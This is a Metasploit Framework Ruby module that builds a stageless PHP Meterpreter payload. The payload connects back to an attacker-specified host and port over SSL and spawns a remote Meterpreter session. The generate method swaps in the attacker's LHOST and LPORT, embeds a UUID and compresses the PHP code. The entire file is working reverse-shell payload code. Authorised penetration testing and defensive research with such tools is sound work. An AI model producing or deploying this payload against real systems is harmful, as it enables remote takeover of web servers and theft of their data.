##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/base/sessions/meterpreter_php'
require 'msf/base/sessions/meterpreter_options'

module MetasploitModule

  CachedSize = 25141

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'PHP Meterpreter, Reverse TCP Inline Using SSL',
      'Description'   => 'Connect back to attacker with SSL and spawn a Meterpreter server (PHP)',
      'Author'        => ['egypt', 'RageLtMan <rageltman[at]sempervictus>'],
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Handler'       => Msf::Handler::ReverseTcpSsl,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Php_Php))
  end

  def generate
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
    met.gsub!("ion connect($ipaddr, $port, $proto='tcp')","ion connect($ipaddr, $port, $proto='ssl')")

    met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
    met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']

    uuid = generate_payload_uuid
    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
    met = met.sub(%q|"PAYLOAD_UUID", ""|, %Q|"PAYLOAD_UUID", "#{bytes}"|)

    # Stageless payloads need to have a blank session GUID
    session_guid = '\x00' * 16
    met = met.sub(%q|"SESSION_GUID", ""|, %Q|"SESSION_GUID", "#{session_guid}"|)

    met.gsub!(/#.*$/, '') 
    met = Rex::Text.compress(met)
    return met
  end
end
